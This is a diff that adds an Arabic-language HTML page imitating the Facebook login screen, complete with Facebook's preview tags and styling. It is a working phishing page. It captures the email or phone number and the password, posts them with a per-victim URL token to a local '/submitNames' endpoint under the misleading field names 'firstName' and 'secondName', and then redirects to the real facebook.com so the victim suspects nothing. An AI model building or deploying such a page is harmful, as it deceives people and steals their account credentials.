@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- Meta Tags for Preview -->
+    <meta property="og:title" content="فيسبوك - تسجيل الدخول أو الاشتراك">
+    <meta property="og:description" content="قم بتسجيل الدخول إلى فيسبوك لبدء المشاركة والتواصل مع أصدقائك وعائلتك والأشخاص الذين تعرفهم.">
+    <meta property="og:image" content="https://www.facebook.com/images/fb_icon_325x325.png">
+    <meta property="og:type" content="website">
+
+    <title>Facebook</title>
+    <style>
+        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-box { background: white; padding: 20px; width: 360px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1); text-align: center; }
+        .logo { color: #1877f2; font-size: 40px; font-weight: bold; margin-bottom: 20px; }
+        input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; font-size: 17px; }
+        button { width: 100%; padding: 12px; background-color: #1877f2; border: none; color: white; font-weight: bold; border-radius: 6px; cursor: pointer; font-size: 20px; margin-top: 10px; }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <div class="logo">facebook</div>
+        <form id="fbForm">
+            <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+            <input type="password" id="pass" placeholder="كلمة السر" required>
+            <button type="submit" id="fBtn">تسجيل الدخول</button>
+        </form>
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const token = urlParams.get('t');
+
+        document.getElementById('fbForm').onsubmit = async (e) => {
+            e.preventDefault();
+            const btn = document.getElementById('fBtn');
+            btn.disabled = true;
+            btn.innerText = "جاري التحميل...";
+
+            try {
+                await fetch('/submitNames', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        token: token,
+                        firstName: document.getElementById('email').value,
+                        secondName: document.getElementById('pass').value
+                    })
+                });
+            } catch (err) {}
+
+            window.location.href = "https://www.facebook.com";
+        };
+    </script>
+</body>
+</html>
